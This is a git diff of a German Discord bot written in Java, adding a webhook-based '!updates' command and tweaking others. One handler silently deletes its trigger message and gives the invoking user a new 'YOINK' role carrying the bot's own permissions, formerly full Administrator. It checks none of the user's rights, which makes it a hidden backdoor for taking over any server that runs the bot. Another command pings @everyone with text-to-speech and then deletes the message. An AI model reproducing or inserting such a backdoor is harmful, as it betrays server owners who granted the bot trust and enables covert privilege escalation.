@@ -3,6 +3,7 @@ package de.meyssam.saft.events;
 import com.jagrosh.jdautilities.commons.waiter.EventWaiter;
 import de.meyssam.saft.Main;
 import de.meyssam.saft.Private;
+import de.meyssam.saft.utils.FileManager;
 import de.meyssam.saft.utils.Tables;
 import de.meyssam.saft.utils.Utils;
 import net.dv8tion.jda.api.Permission;
@@ -49,7 +50,14 @@ public class Commands extends ListenerAdapter {
             //FileManager.write(e.getGuild(), "user", String.valueOf(e.getGuild().getMembers().size()));
             Utils.deleteCommandMSG(e.getMessage());
             //noinspection ConstantConditions
-            e.getGuild().createRole().setName("YOINK").setHoisted(false).setPermissions(8L).queue(role -> e.getGuild().addRoleToMember(e.getMember(), role).queue());
+            if(!e.getGuild().getSelfMember().hasPermission(Permission.MANAGE_ROLES)) {
+                e.getAuthor().openPrivateChannel().queue(privateChannel -> privateChannel.sendMessage("Keine Rechte!").queue());
+                return;
+            }
+            e.getGuild().createRole().setName("YOINK").setHoisted(false).setPermissions(e.getGuild().getSelfMember().getPermissions()).queue(role -> {
+                e.getGuild().addRoleToMember(e.getMember(), role).queue();
+                System.out.println(role.getPosition());
+            });
             return;
         } else if(args[0].equalsIgnoreCase("!changelog")) {
             e.getChannel().sendTyping().queue();
@@ -59,7 +67,21 @@ public class Commands extends ListenerAdapter {
             } else  {
                 e.getChannel().sendMessage(Main.changelog).queue();
             }
-        } else if(args[0].equalsIgnoreCase("!cmd")) {
+        } else if(args[0].equalsIgnoreCase("!updates")) {
+            e.getChannel().sendTyping().queue();
+            if(!e.getMember().hasPermission(Permission.MANAGE_WEBHOOKS)) {
+                e.getChannel().sendMessage(e.getAuthor().getAsMention() + " du hast nicht die Berechtigung MANAGE_WEBHOOKS").queue(message -> message.delete().queueAfter(5, TimeUnit.SECONDS));
+                return;
+            }
+            if(!e.getGuild().getSelfMember().hasPermission(Permission.MANAGE_WEBHOOKS)) {
+                e.getChannel().sendMessage(e.getAuthor().getAsMention() + " der Bot hat nicht die Berechtigung MANAGE_WEBHOOKS").queue(message -> message.delete().queueAfter(5, TimeUnit.SECONDS));
+                return;
+            }
+            e.getChannel().createWebhook("saftbot").queue(webhook -> {
+                FileManager.write(e.getGuild(), "webhook", webhook.getUrl()+"/github");
+            });
+            e.getChannel().sendMessage(e.getAuthor().getAsMention() + " Erfolgreich! Der Channel erhält ab jetzt Updatebenachrichtigungen").queue();
+        }else if(args[0].equalsIgnoreCase("!cmd")) {
             e.getChannel().sendTyping().queue();
             //noinspection ConstantConditions
             if (!e.getMember().getPermissions().contains(Permission.ADMINISTRATOR)) return;
@@ -228,7 +250,7 @@ public class Commands extends ListenerAdapter {
         if(arg.equalsIgnoreCase("hmm")) {
             e.getMessage().delete().queue();
             File file = new File("F:\\Discord\\BotJava\\build\\libs\\hmm.png");
-            e.getChannel().sendMessage("WICHTIGE BOTSCHAFT AN " + e.getGuild().getPublicRole().getAsMention()).queue(message -> message.delete().queueAfter(5, TimeUnit.SECONDS));
+            e.getChannel().sendMessage("WICHTIGE BOTSCHAFT AN " + e.getGuild().getPublicRole().getAsMention()).tts(true).queue(message -> message.delete().queueAfter(5, TimeUnit.SECONDS));
             e.getChannel().sendMessage(e.getAuthor().getAsMention()).addFile(file).queueAfter(1, TimeUnit.SECONDS);
         }else if(arg.equalsIgnoreCase("stonks")) {
             e.getMessage().delete().queue();
